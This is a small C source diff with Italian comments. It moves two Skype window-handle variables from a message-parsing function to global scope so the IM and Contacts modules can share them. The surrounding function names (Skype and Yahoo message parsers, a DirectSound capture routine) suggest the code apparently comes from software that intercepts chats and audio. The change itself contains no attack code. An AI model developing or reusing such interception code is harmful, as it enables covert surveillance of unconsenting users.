@@ -117,6 +117,10 @@ BOOL bPM_spmcp = FALSE; // Semaforo per l'uscita del thread
 HANDLE hSkypePMThread = NULL;
 BOOL IsSkypePMInstalled();
 
+// Sono condivise anche da IM e Contacts
+HWND skype_api_wnd = NULL;
+HWND skype_pm_wnd = NULL;
+
 #include <mmsystem.h>
 // XXX Dovrei liberare i buffer e le strutture create
 BYTE *GetDirectSoundGetCP(BYTE **DSLock, BYTE **DSUnlock, BYTE **DSGetFormat)
@@ -2156,8 +2160,6 @@ BOOL ParseYahooMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 
 BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 {
-	static HWND skype_api_wnd = NULL;
-	static HWND skype_pm_wnd = NULL;
 	COPYDATASTRUCT cd_struct;
 	DWORD call_id;
 	char req_buf[256];
